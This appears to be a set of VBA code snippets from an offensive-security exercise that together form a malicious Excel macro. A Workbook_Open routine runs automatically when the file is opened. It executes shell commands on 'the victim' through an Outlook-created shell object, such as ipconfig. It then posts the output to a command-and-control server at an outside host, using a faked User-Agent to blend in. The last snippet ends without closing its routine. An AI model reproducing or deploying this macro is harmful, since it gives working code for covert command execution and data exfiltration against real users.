```
'function for running commands on the victim
Function RunCommand (command As String) As String

	On Error GoTo error

	'create outlook object
	Set objOL = CreateObject("Outlook.Application")

	'create shell obj under the outlook object
	Set WshShell = objOL.CreateObject("Wscript.Shell")

	'execute command from shell object
	Set WshShellExec = WshShell.Exec(command)

	'read output of the command
	RunCommand = WshShellExec.StdOut.ReadAll

Done:
		Exit Function

error:
		RunCommand = “ERROR”
		
End Function
```





```
'function for sending data to the c&c Server
Function SendToServer(data As String)

	On Error GoTo error

	Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")

	'set the connect to IP and Port
	Url = “http://desktop1.vrnslab.se:5000”
	
	'send data as POST request
	objHTTP.Open “POST”, Url, False
	
	'set ua to look more like natural traffic
	objHTTP.setRequestHeader “User-Agent”, “Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)”

	'send the data
	objHTTP.send (data)

Done:
		Exit Function

error:
		MsgBox ("Cannot connect to Server")

End Function
```





```
'opened when workbook is opened
Sub Workbook_Open()

	Dim strData As String
	Dim strCommand As String


	strOutput = RunCommand("ipconfig")
	MsgBox (strOutput)
	SendToServer (strOutput)
```

